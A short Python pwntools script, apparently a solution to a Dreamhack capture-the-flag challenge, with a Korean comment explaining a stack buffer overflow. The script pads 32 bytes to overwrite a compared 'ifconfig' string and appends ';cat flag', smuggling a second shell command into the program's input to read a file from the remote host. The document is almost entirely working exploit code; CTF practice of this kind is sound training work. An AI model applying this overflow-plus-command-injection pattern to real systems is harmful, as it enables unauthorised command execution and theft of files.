from pwn import *

r = remote("host1.dreamhack.games", 20511)

print r.recv()


'''
입력받는 부분 RBP-0x130, 0x64만큼 입력받음 -> bof문제
ifconfig 문자열 RBP-0x110
strncmp로 문자열비교부분있음 그래서 0x20만큼 A로 덮고
ifconfig문자원래 그대로 넣어준뒤
세미콜론 추가해서 플래그 획득
'''
dummy = "A"*32
payload  = dummy
payload += "ifconfig"
payload += ";cat flag"

r.send(payload)

r.interactive()
